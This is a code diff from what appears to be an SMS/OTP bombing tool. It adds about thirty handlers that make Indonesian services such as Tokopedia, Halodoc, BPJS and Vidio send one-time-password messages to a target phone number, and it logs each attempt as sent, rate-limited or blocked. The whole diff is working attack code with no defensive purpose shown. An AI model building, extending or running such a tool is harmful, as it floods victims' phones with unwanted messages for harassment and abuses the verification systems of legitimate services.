@@ -28,6 +28,20 @@ from handlers import (
     send_cmkclub_otp,send_babyhappy_otp,send_bukuaku_otp,send_generasi_otp,
     send_insureka_otp,send_opaper_otp,send_rappi_otp,send_segari_otp,
     send_toyota_otp,send_garasi_otp,send_jakartanote_otp,send_kitabisa_otp,
+    send_bmsecure_aci_otp,send_pizzahut_otp2,send_akseleran_otp,send_irmastore_otp,
+    send_tiptip_otp,send_tokoplas_otp,send_toplusms_otp,send_vidio_otp,send_kpoin_otp,
+    send_nusasms_otp,send_berprestasi_otp,send_bisatopup_otp,send_stockbit_otp,
+    send_misteraladin_otp,send_redbus_otp,send_buccheri_otp,send_gabino_otp,
+    send_moladin_otp,send_adiraku_otp,send_tri_otp,send_bmsecure_sofia_otp,
+    send_alodokter_otp,send_alomedika_otp,send_bpjs_otp,send_halodoc_otp,
+    send_pinhome_otp,send_rumah123_otp,
+    send_tokopedia_wa_otp,send_bmsecure_aci_otp,send_pizzahut_otp2,
+    send_segari_otp2,send_akseleran_otp,send_irmastore_otp,send_tiptip_otp,
+    send_tokoplas_otp,send_toplusms_otp,send_vidio_otp,send_kpoin_otp,
+    send_nusasms_otp,send_berprestasi_otp,send_bisatopup_otp,send_stockbit_otp,
+    send_misteraladin_otp,send_redbus_otp,send_buccheri_otp,send_gabino_otp,
+    send_moladin_otp,send_adiraku_otp,send_tri_otp,send_bmsecure_sofia_otp,
+    send_alodokter_otp,send_alomedika_otp,send_bpjs_otp,send_halodoc_otp,
 )
 from targets import TARGETS
 
@@ -432,6 +446,61 @@ def process_target(api, target62, ip, idx, total):
             return success
 
         
+        elif post_type in ('tokopedia_wa','bmsecure_aci','pizzahut2','segari2','akseleran',
+                           'irmastore','tiptip','tokoplas','toplusms','vidio','kpoin',
+                           'nusasms','berprestasi','bisatopup','stockbit','misteraladin',
+                           'redbus','buccheri','gabino','moladin','adiraku','tri',
+                           'bmsecure_sofia','alodokter','alomedika','bpjs','halodoc',
+                           'pinhome','rumah123'):
+            _fn_map = {
+                'tokopedia_wa':  send_tokopedia_wa_otp,
+                'bmsecure_aci':  send_bmsecure_aci_otp,
+                'pizzahut2':     send_pizzahut_otp2,
+                'segari2':       send_segari_otp2,
+                'akseleran':     send_akseleran_otp,
+                'irmastore':     send_irmastore_otp,
+                'tiptip':        send_tiptip_otp,
+                'tokoplas':      send_tokoplas_otp,
+                'toplusms':      send_toplusms_otp,
+                'vidio':         send_vidio_otp,
+                'kpoin':         send_kpoin_otp,
+                'nusasms':       send_nusasms_otp,
+                'berprestasi':   send_berprestasi_otp,
+                'bisatopup':     send_bisatopup_otp,
+                'stockbit':      send_stockbit_otp,
+                'misteraladin':  send_misteraladin_otp,
+                'redbus':        send_redbus_otp,
+                'buccheri':      send_buccheri_otp,
+                'gabino':        send_gabino_otp,
+                'moladin':       send_moladin_otp,
+                'adiraku':       send_adiraku_otp,
+                'tri':           send_tri_otp,
+                'bmsecure_sofia':send_bmsecure_sofia_otp,
+                'alodokter':     send_alodokter_otp,
+                'alomedika':     send_alomedika_otp,
+                'bpjs':          send_bpjs_otp,
+                'halodoc':       send_halodoc_otp,
+                'pinhome':       send_pinhome_otp,
+                'rumah123':      send_rumah123_otp,
+            }
+            code, text = _fn_map[post_type](target62)
+            if code in [200, 201, 202]:
+                status_text, detail, success = "SUCCESS", "OTP sent", True
+            elif code == 429:
+                status_text, detail = "LIMITED", "Rate limit"
+            elif code == 403:
+                status_text, detail = "BLOCKED", "Forbidden"
+            elif code is None:
+                status_text, detail = "ERROR", str(text)[:40]
+            else:
+                kws = api.get('success_on', [])
+                if any(k.lower() in (text or '').lower() for k in kws):
+                    status_text, detail, success = "SUCCESS", "OTP sent", True
+                else:
+                    status_text, detail = "FAIL", f"({code})"
+            log_target(idx, total, name, status_text, detail)
+            return success
+
         elif post_type == 'json':
             number = api['number_fmt'](target62)
             url = api.get('url', '').replace('{rand}', str(uuid.uuid4()))
